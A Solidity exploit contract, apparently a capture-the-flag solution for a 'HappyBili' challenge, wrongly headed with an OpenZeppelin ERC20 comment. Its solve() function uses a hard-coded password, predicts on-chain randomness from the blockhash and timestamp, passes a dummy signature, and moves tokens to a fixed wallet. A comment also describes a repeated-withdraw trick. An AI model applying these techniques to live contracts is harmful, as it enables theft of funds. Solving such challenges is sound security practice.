// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.2;

import "./ctf.sol";

interface HappyBiliAPI {
    function auth1(uint pass_) external;

    function auth2(uint pass_) external;

    function testborrowtwice(SignCoupon calldata scoupon) external;

    function buy(uint amount) external;

    function transfer(address to, uint256 amount) external;

    function deposit() external;

    function borrow(uint amount) external;
}

contract solution {
    HappyBiliAPI constant private instance = HappyBiliAPI(0x053cd080A26CB03d5E6d2956CeBB31c56E7660CA);

    function solve() public {
        instance.auth1(22331024);
        instance.auth2(uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
//        instance.deposit();
        // instance.borrow();
        Coupon memory coupon = Coupon(2233, 300, address(this), "bilibili");
        Signature memory sign = Signature(1, [bytes32("a"), bytes32("b")]);
        SignCoupon memory sc = SignCoupon(coupon, sign);
        instance.testborrowtwice(sc);
        instance.buy(300);
        address myWallet = 0xacCC4b4B145e8D1061141c4E35A6d393d93085b8;
        instance.transfer(address(myWallet), 300);
    }

    // call deposit() -> sale() -> withdraw() -> sale() -> withdraw()
    // can also use buy() to increase your balances
}
